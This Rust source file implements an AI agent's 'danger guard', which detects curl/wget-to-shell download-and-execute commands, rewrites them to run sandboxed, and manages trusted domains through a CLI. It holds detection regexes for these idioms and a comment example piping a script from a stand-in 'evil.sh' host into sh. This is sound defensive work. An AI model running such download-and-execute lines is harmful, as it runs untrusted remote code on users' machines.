//! the danger guard: trusted-domain store, guard.json settings + `opencapx guard` CLI, download-and-execute pattern rewriting.
//! Mechanical move from core/sandbox.rs.

use super::*;
use clap::{Parser, Subcommand};

/// Trust file location; tests override with `OPEN_CAPX_GUARD_FILE`.
pub fn guard_file() -> PathBuf {
    if let Ok(p) = std::env::var("OPEN_CAPX_GUARD_FILE") {
        return PathBuf::from(p);
    }
    crate::core::home_dir()
        .map(|h| h.join(".opencapx").join("guard.json"))
        .unwrap_or_else(|| std::env::temp_dir().join("opencapx-guard.json"))
}

/// Parsed `guard.json`. Fail-open: missing/corrupt file → defaults (nothing trusted, guard on).
#[derive(Default)]
struct GuardFile {
    trusted_domains: Vec<String>,
    /// `installer` (default) / `strict` / `off` — the danger-guard stance, set via
    /// `opencapx guard mode`. `OPEN_CAPX_DANGER_GUARD` still overrides it per-invocation.
    danger_guard: Option<String>,
    /// `strip` (default) / `keep` / `clear` — the `--env` policy baked into the rewrite,
    /// set via `opencapx guard env`. `keep` exists for installers that consume
    /// registry/CI tokens from the environment (npm `_authToken` etc. match the secret
    /// name filter and would otherwise be stripped).
    env: Option<String>,
    /// `false` (default) / `true` — bake `--require` into the guard's sandbox invocation,
    /// set via `opencapx guard require`. Unlike the stance there is deliberately no env-var
    /// override: the hook runs inside the agent's environment, and require is the one knob
    /// that must not be turnable off from there.
    require: Option<bool>,
}

fn load_guard_file() -> GuardFile {
    let Ok(raw) = std::fs::read_to_string(guard_file()) else {
        return GuardFile::default();
    };
    let Ok(v) = serde_json::from_str::<serde_json::Value>(&raw) else {
        return GuardFile::default();
    };
    let str_field = |name: &str| v.get(name).and_then(|d| d.as_str()).map(|s| s.to_string());
    GuardFile {
        trusted_domains: v
            .get("trusted_domains")
            .and_then(|d| d.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str())
                    .map(|s| s.to_lowercase())
                    .collect()
            })
            .unwrap_or_default(),
        danger_guard: str_field("danger_guard"),
        env: str_field("env"),
        require: v.get("require").and_then(|d| d.as_bool()),
    }
}

/// Effective danger-guard stance: `OPEN_CAPX_DANGER_GUARD` (explicit per-invocation override)
/// beats the `guard.json` field, which beats the default (installer).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct GuardSettings {
    pub enabled: bool,
    pub profile: &'static str,
    /// The `--env` policy the rewrite passes to `opencapx sandbox`.
    pub env: &'static str,
    /// Whether the rewrite adds `--require` (refuse instead of an unguarded run).
    pub require: bool,
}

pub fn resolve_guard_settings() -> GuardSettings {
    // Case-insensitive on both sources: `Strict`/`OFF` silently resolving to the
    // installer default (network open) would be fail-unsafe for a typo'd stance.
    let file = load_guard_file();
    let mode = std::env::var("OPEN_CAPX_DANGER_GUARD")
        .ok()
        .or(file.danger_guard)
        .map(|s| s.trim().to_lowercase());
    let (enabled, profile) = match mode.as_deref() {
        Some("off") | Some("0") | Some("false") => (false, "installer"),
        Some("strict") => (true, "strict"),
        _ => (true, "installer"),
    };
    let env = match file.env.as_deref() {
        Some(e) if e.eq_ignore_ascii_case("keep") => "keep",
        Some(e) if e.eq_ignore_ascii_case("clear") => "clear",
        _ => "strip",
    };
    GuardSettings {
        enabled,
        profile,
        env,
        require: file.require.unwrap_or(false),
    }
}

/// Load trusted domains. Fail-open: a missing or corrupt file means "nothing is trusted".
pub fn load_trusted() -> Vec<String> {
    load_guard_file().trusted_domains
}

/// Serialize the whole file (both fields — a trust edit must not clobber the mode and vice
/// versa) and lock it down: the file names hosts the user explicitly vouched for. Created
/// directly at 0600 (write-then-chmod would leave a 0644 window on first creation).
fn save_guard_file(f: &GuardFile) -> Result<(), String> {
    let path = guard_file();
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("mkdir {}: {e}", dir.display()))?;
    }
    let mut v = serde_json::json!({ "version": 1, "trusted_domains": f.trusted_domains });
    if let Some(mode) = &f.danger_guard {
        v["danger_guard"] = serde_json::json!(mode);
    }
    if let Some(env) = &f.env {
        v["env"] = serde_json::json!(env);
    }
    if let Some(require) = f.require {
        v["require"] = serde_json::json!(require);
    }
    let body = serde_json::to_string_pretty(&v).unwrap_or_default();
    #[cfg(unix)]
    let write_0600 = || {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create(true).truncate(true).mode(0o600);
        opts.open(&path)
            .and_then(|mut fh| fh.write_all(body.as_bytes()))
            .map_err(|e| format!("write {}: {e}", path.display()))
    };
    #[cfg(not(unix))]
    let write_0600 =
        || std::fs::write(&path, &body).map_err(|e| format!("write {}: {e}", path.display()));
    write_0600()?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }
    Ok(())
}

fn save_trusted(domains: &[String]) -> Result<(), String> {
    let mut f = load_guard_file();
    f.trusted_domains = domains.to_vec();
    save_guard_file(&f)
}

#[derive(Parser)]
struct GuardCli {
    #[command(subcommand)]
    cmd: GuardCmd,
}

#[derive(Subcommand)]
enum GuardCmd {
    /// List the guard mode and the trusted domains
    List,
    /// Print or set the environment policy
    Env {
        #[arg(value_parser = ["strip", "keep", "clear"])]
        policy: Option<String>,
    },
    /// Print or set whether guarded runs require a sandbox backend
    Require {
        #[arg(value_parser = ["on", "off"])]
        state: Option<String>,
    },
    /// Print or set the guard mode
    Mode {
        #[arg(value_parser = ["installer", "strict", "off"])]
        mode: Option<String>,
    },
    /// Trust a download host (download-and-run from it passes through, audited)
    Trust { domain: String },
    /// Stop trusting a download host
    Untrust { domain: String },
}

pub fn run_guard_cli(args: &[String]) -> i32 {
    let cli = match crate::core::cli::parse::<GuardCli>("opencapx guard", args) {
        Ok(c) => c,
        Err(code) => return code,
    };
    match cli.cmd {
        GuardCmd::List => {
            let g = load_guard_file();
            let s = resolve_guard_settings();
            println!(
                "guard mode: {} | env: {} | require: {} ({})",
                if s.enabled { s.profile } else { "off" },
                s.env,
                if s.require { "on" } else { "off" },
                guard_file().display()
            );
            println!("trusted domains ({}):", g.trusted_domains.len());
            if g.trusted_domains.is_empty() {
                println!("  (none)");
            }
            for d in g.trusted_domains {
                println!("  {d}");
            }
            0
        }
        GuardCmd::Env { policy } => {
            let Some(policy) = policy else {
                let s = resolve_guard_settings();
                println!("guard env: {}", s.env);
                return 0;
            };
            let mut f = load_guard_file();
            f.env = Some(policy.clone());
            match save_guard_file(&f) {
                Ok(()) => {
                    println!("guard env: {policy}");
                    0
                }
                Err(e) => {
                    eprintln!("guard env: {e}");
                    1
                }
            }
        }
        GuardCmd::Require { state } => {
            let Some(state) = state else {
                let s = resolve_guard_settings();
                println!("guard require: {}", if s.require { "on" } else { "off" });
                return 0;
            };
            let mut f = load_guard_file();
            f.require = Some(state == "on");
            match save_guard_file(&f) {
                Ok(()) => {
                    println!("guard require: {state}");
                    0
                }
                Err(e) => {
                    eprintln!("guard require: {e}");
                    1
                }
            }
        }
        GuardCmd::Mode { mode } => {
            let Some(mode) = mode else {
                let s = resolve_guard_settings();
                println!(
                    "danger guard: {}",
                    if s.enabled { s.profile } else { "off" }
                );
                return 0;
            };
            let mut f = load_guard_file();
            f.danger_guard = Some(mode.clone());
            match save_guard_file(&f) {
                Ok(()) => {
                    println!("danger guard: {mode}");
                    0
                }
                Err(e) => {
                    eprintln!("guard mode: {e}");
                    1
                }
            }
        }
        GuardCmd::Trust { domain } => {
            let domain = domain.trim().to_lowercase();
            if domain.is_empty() || domain.contains('/') || domain.contains(' ') {
                eprintln!("guard trust: not a hostname: {domain}");
                return 2;
            }
            let mut domains = load_trusted();
            if domains.iter().any(|d| d == &domain) {
                println!("already trusted: {domain}");
                return 0;
            }
            domains.push(domain.clone());
            match save_trusted(&domains) {
                Ok(()) => {
                    println!("trusted: {domain} (download-and-run from this host will pass through, audited)");
                    0
                }
                Err(e) => {
                    eprintln!("guard trust: {e}");
                    1
                }
            }
        }
        GuardCmd::Untrust { domain } => {
            let domain = domain.trim().to_lowercase();
            let mut domains = load_trusted();
            let before = domains.len();
            domains.retain(|d| d != &domain);
            if domains.len() == before {
                println!("not trusted: {domain}");
                return 0;
            }
            match save_trusted(&domains) {
                Ok(()) => {
                    println!("untrusted: {domain}");
                    0
                }
                Err(e) => {
                    eprintln!("guard untrust: {e}");
                    1
                }
            }
        }
    }
}

/// Every `http(s)://host[:port][/…]` token in the download arguments, hosts lowercased.
/// All of them, not just the first: a decoy trusted URL in another argument
/// (`curl -A "https://trusted.rs" https://evil.sh/x | sh`) or a second fetch target must
/// not vouch for the line — trust requires the whole line to be trusted.
fn url_hosts(args: &str) -> Vec<String> {
    let mut out = Vec::new();
    for t in args.split_whitespace() {
        let t = t.trim_matches(|c| c == '"' || c == '\'');
        // Non-URL tokens (flags, `-o`, …) are skipped, not fatal — the URL can be anywhere.
        let Some(rest) = t
            .strip_prefix("https://")
            .or_else(|| t.strip_prefix("http://"))
        else {
            continue;
        };
        let host = rest.split('/').next().unwrap_or("");
        let host = host.rsplit('@').next().unwrap_or(host);
        let host = host.split(':').next().unwrap_or(host);
        if !host.is_empty() {
            out.push(host.to_lowercase());
        }
    }
    out
}

/// A whole-line rewrite produced by the guard. `rule_id` is what the audit trail records.
pub struct GuardHit {
    pub rule_id: &'static str,
    pub command: String,
}

struct GuardPatterns {
    pipe_shell: regex::Regex,
    process_sub: regex::Regex,
    sh_c_cmdsub: regex::Regex,
    eval_cmdsub: regex::Regex,
    short_flag_cluster: regex::Regex,
    /// The idiom present anywhere in the line (not anchored at the head) — e.g.
    /// `cd /tmp && curl … | sh`. Cannot be rewritten safely (compound tail), audit-only.
    embedded: regex::Regex,
}

fn guard_patterns() -> &'static GuardPatterns {
    static P: std::sync::OnceLock<GuardPatterns> = std::sync::OnceLock::new();
    P.get_or_init(|| GuardPatterns {
        // Downloader token may be backslash-quoted (`\curl`) and/or carry a path prefix
        // (`/usr/bin/curl`, `./wget`) — the rewriter reconstructs the verbatim token from the
        // source slice, the groups only pin the match.
        pipe_shell: regex::Regex::new(
            r#"^\s*\\?(\S*/)?(curl|wget)\s+([^|;&<>`]*?)\s*\|\s*(sh|bash|zsh|dash|ksh)(?:\s+([^|;&<>`]*))?\s*$"#,
        )
        .expect("pipe_shell regex"),
        process_sub: regex::Regex::new(
            r#"^\s*(sh|bash|zsh|dash|ksh)\s+((?:-[A-Za-z-]+\s+)*)<\((\S*/)?(curl|wget)\s+([^)|;&<>`]+)\)\s*$"#,
        )
        .expect("process_sub regex"),
        sh_c_cmdsub: regex::Regex::new(
            r#"^\s*(sh|bash|zsh|dash|ksh)\s+-c\s+"\$\((\S*/)?(curl|wget)\s+([^)"`;|&<>()]+)\)"\s*$"#,
        )
        .expect("sh_c_cmdsub regex"),
        eval_cmdsub: regex::Regex::new(
            r#"^\s*eval\s+"\$\((\S*/)?(curl|wget)\s+([^)"`;|&<>()]+)\)"\s*$"#,
        )
        .expect("eval_cmdsub regex"),
        short_flag_cluster: regex::Regex::new(r"^-[A-Za-z-]+$").expect("cluster regex"),
        embedded: regex::Regex::new(
            r#"(?:curl|wget2?|axel|xh|aria2c)\s+[^|;&<>`]*\|\s*(?:sh|bash|zsh|dash|ksh)\b"#,
        )
        .expect("embedded regex"),
    })
}

/// Lead words the guard can safely re-attach around: wrappers that do NOT change privileges.
/// `sudo` / `doas` are deliberately absent — a privileged download-and-execute is out of
/// scope (returned as `None`, no rewrite, mirroring the shell-side bail). `env`'s own flags
/// (`-i`, `-u NAME`, `--ignore-environment`, `--unset[=]NAME`) are peeled too — without
/// them, `env -i curl … | sh` would slip the guard while plain `curl … | sh` does not.
/// (`xargs curl … | sh` is deliberately NOT peeled: it changes the downloader's argument
/// semantics, so that shape stays audit-only.)
const GUARD_LEAD_WRAPPERS: &[&str] = &["env", "nohup", "nice", "time", "command"];

/// Guard-side `(lead, body)` split: peels non-privilege wrapper words (plus `env`'s flags)
/// and `KEY=VAL` assignments so `env FOO=1 curl … | sh` matches like `curl … | sh`, and the
/// rewrite re-attaches the lead (the assignments belong to the download, exactly as the user
/// wrote). `None` = privilege wrapper hit (`sudo`, `doas`) — leave the whole line alone.
fn guard_split_lead(cmd: &str) -> Option<(&str, &str)> {
    let mut idx = 0usize;
    let mut pending_env_value = false; // `-u NAME` / `--unset NAME`: NAME is a value, not the command
    loop {
        let rest = &cmd[idx..];
        let trimmed = rest.trim_start();
        idx += rest.len() - trimmed.len();
        let tok_end = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
        let tok = &trimmed[..tok_end];
        if tok.is_empty() {
            break;
        }
        if tok == "sudo" || tok == "doas" {
            return None;
        }
        let mut peel = pending_env_value
            || GUARD_LEAD_WRAPPERS.contains(&tok)
            || crate::core::rules::transform::is_env_assignment(tok);
        pending_env_value = false;
        peel |= tok == "-i"
            || tok == "--ignore-environment"
            || tok.starts_with("-u")
            || tok.starts_with("--unset");
        if tok == "-u" || tok == "--unset" {
            pending_env_value = true;
        }
        if !peel {
            break;
        }
        idx += tok_end;
    }
    Some((&cmd[..idx], &cmd[idx..]))
}

/// Build the download half: keep the original arguments, append an explicit output target.
/// `dl_tok` is the downloader token as written (may carry a path prefix, kept verbatim);
/// `kind` is the bare binary name and decides the flag/conflict rules.
/// Refuses when the downloader already chooses one (`-o`/`-O`/`--output`/`--remote-name` and
/// their attached forms), because appending a second target could silently change semantics.
fn download_to(
    dl_tok: &str,
    kind: &str,
    args: &str,
    tmp: &str,
    p: &GuardPatterns,
) -> Option<String> {
    for t in args.split_whitespace() {
        let conflict = match kind {
            "wget" => {
                t == "--output-document"
                    || t.starts_with("--output-document=")
                    || t.starts_with("-O")
                    || (p.short_flag_cluster.is_match(t) && t.contains('O'))
            }
            _ => {
                t == "--output"
                    || t.starts_with("--output=")
                    || t == "--remote-name"
                    || t.starts_with("-o")
                    || t.starts_with("-O")
                    || (p.short_flag_cluster.is_match(t) && (t.contains('o') || t.contains('O')))
            }
        };
        if conflict {
            return None;
        }
    }
    let flag = if kind == "wget" { "-O" } else { "-o" };
    let args = args.trim();
    Some(if args.is_empty() {
        format!("{dl_tok} {flag} {tmp}")
    } else {
        format!("{dl_tok} {args} {flag} {tmp}")
    })
}

fn shell_quote(s: &str) -> String {
    format!("\"{}\"", s.replace('\\', "\\\\").replace('"', "\\\""))
}

/// Audit-only hit: the command runs unchanged, the shape lands in the Activity Timeline.
fn audit_only(command: &str, rule_id: &'static str) -> GuardHit {
    GuardHit {
        rule_id,
        command: command.to_string(),
    }
}

/// Match a download-and-execute pipeline; return the sandboxed whole-line rewrite.
/// Trusted download hosts ([`load_trusted`]) pass through untouched, audited as
/// `danger/trusted-passthrough` — the explicit escape for installers that need what the
/// sandbox will never grant (sudo, writes outside `$HOME`).
///
/// Audit-only hits (command unchanged, shape still visible):
/// - `danger/unsupported-shape` — the idiom matched but cannot be rewritten with confidence
///   (`sh -s`, downloader output flags, …);
/// - `danger/embedded-download-execute` — the idiom sits inside a compound line
///   (`cd /tmp && curl … | sh`); the tail cannot be replaced safely.
///
/// `env` selects the sandbox runner's `--env` policy written into the rewrite
/// (strip/keep/clear — see [`EnvPolicy`]); it comes from `opencapx guard env`.
pub fn guard(
    command: &str,
    bin: &str,
    profile: &str,
    env: &str,
    require: bool,
) -> Option<GuardHit> {
    guard_with(command, bin, profile, env, require, &load_trusted())
}

/// The rewrite skeleton: mktemp a random path (the old fixed `opencapx-dl-$$.sh` was
/// predictable and curl follows symlinks — a local attacker could pre-plant it), download,
/// execute sandboxed, then clean up and propagate the real exit code (`(exit N)` sets `$?`
/// without exiting the host shell — some agents run commands in a persistent shell).
const DL_VAR: &str = "__ocx_dl";

const RC_VAR: &str = "__ocx_rc";

pub(crate) fn guard_with(
    command: &str,
    bin: &str,
    profile: &str,
    env: &str,
    require: bool,
    trusted: &[String],
) -> Option<GuardHit> {
    let p = guard_patterns();
    let (lead, body) = guard_split_lead(command)?;
    let tmp = format!("\"${DL_VAR}\"");
    let mktemp = format!("{DL_VAR}=\"$(mktemp \"${{TMPDIR:-/tmp}}/opencapx-dl-XXXXXX.sh\")\"");
    let cleanup = format!("; {RC_VAR}=$?; rm -f \"${DL_VAR}\"; (exit ${RC_VAR})");
    let bin_q = shell_quote(bin);
    // `--require` flips the runner's fail-open contract to refuse: guard stances that would
    // rather stop the download-and-run than let it execute unguarded (e.g. on Windows).
    let require_flag = if require { " --require" } else { "" };
    // Trusted passthrough requires: at least one URL, and EVERY URL in the line trusted —
    // a decoy trusted token next to an untrusted payload URL must not vouch for the line.
    let is_trusted = |args: &str| {
        let hosts = url_hosts(args);
        !hosts.is_empty() && hosts.iter().all(|h| trusted.iter().any(|d| d == h))
    };

    if let Some(c) = p.pipe_shell.captures(body) {
        // The verbatim downloader token as written (backslash quote / path prefix included).
        let dl_tok = &body[..c.get(2).unwrap().end()];
        let sh_args = c
            .get(5)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        // Only plain flags survive the rewrite. Bail (audit-only) when the shell takes:
        // stdin semantics (`-s`, bare `-`), an interactive flag (`-i`), or any positional
        // operand (`/dev/stdin`, a script name) — the file-based rewrite would change what
        // runs. The downloaded file is appended as the operand instead.
        if sh_args
            .split_whitespace()
            .any(|t| !t.starts_with('-') || t == "-" || t.contains('s') || t.contains('i'))
        {
            return Some(audit_only(command, "danger/unsupported-shape"));
        }
        if is_trusted(&c[3]) {
            return Some(audit_only(command, "danger/trusted-passthrough"));
        }
        let Some(dl_cmd) = download_to(dl_tok, &c[2], &c[3], &tmp, p) else {
            return Some(audit_only(command, "danger/unsupported-shape"));
        };
        let mut exec = vec![c[4].to_string()];
        if !sh_args.is_empty() {
            exec.push(sh_args);
        }
        exec.push(tmp.clone());
        return Some(GuardHit {
            rule_id: "danger/download-pipe-shell",
            command: format!(
                "{mktemp} && {lead}{dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- {}{cleanup}",
                exec.join(" ")
            ),
        });
    }
    // Substitution forms (`bash <(curl …)` etc.) with a lead: the lead's environment must
    // reach the executed script, not just the download half — the split rewrite cannot express
    // that. Rare combo; audit and stand down instead of silently diverging.
    if !lead.is_empty()
        && (p.process_sub.is_match(body)
            || p.sh_c_cmdsub.is_match(body)
            || p.eval_cmdsub.is_match(body))
    {
        return Some(audit_only(command, "danger/unsupported-shape"));
    }
    if let Some(c) = p.process_sub.captures(body) {
        let dl_tok = &body[..c.get(4).unwrap().end()];
        if is_trusted(&c[5]) {
            return Some(audit_only(command, "danger/trusted-passthrough"));
        }
        let Some(dl_cmd) = download_to(dl_tok, &c[4], &c[5], &tmp, p) else {
            return Some(audit_only(command, "danger/unsupported-shape"));
        };
        let flags = c[2].trim();
        let mut exec = vec![c[1].to_string()];
        if !flags.is_empty() {
            exec.push(flags.to_string());
        }
        exec.push(tmp.clone());
        return Some(GuardHit {
            rule_id: "danger/download-process-substitution",
            command: format!(
                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- {}{cleanup}",
                exec.join(" ")
            ),
        });
    }
    if let Some(c) = p.sh_c_cmdsub.captures(body) {
        let dl_tok = &body[..c.get(3).unwrap().end()];
        if is_trusted(&c[4]) {
            return Some(audit_only(command, "danger/trusted-passthrough"));
        }
        let Some(dl_cmd) = download_to(dl_tok, &c[3], &c[4], &tmp, p) else {
            return Some(audit_only(command, "danger/unsupported-shape"));
        };
        return Some(GuardHit {
            rule_id: "danger/download-command-substitution",
            command: format!(
                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- sh {tmp}{cleanup}"
            ),
        });
    }
    if let Some(c) = p.eval_cmdsub.captures(body) {
        let dl_tok = &body[..c.get(2).unwrap().end()];
        if is_trusted(&c[3]) {
            return Some(audit_only(command, "danger/trusted-passthrough"));
        }
        let Some(dl_cmd) = download_to(dl_tok, &c[2], &c[3], &tmp, p) else {
            return Some(audit_only(command, "danger/unsupported-shape"));
        };
        return Some(GuardHit {
            rule_id: "danger/download-eval",
            command: format!(
                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- sh {tmp}{cleanup}"
            ),
        });
    }
    // Nothing anchored matched; if the idiom is present mid-line, make it visible without
    // touching it — replacing a compound tail is exactly the "wrong rewrite" the engine refuses.
    if p.embedded.is_match(body) {
        return Some(audit_only(command, "danger/embedded-download-execute"));
    }
    None
}
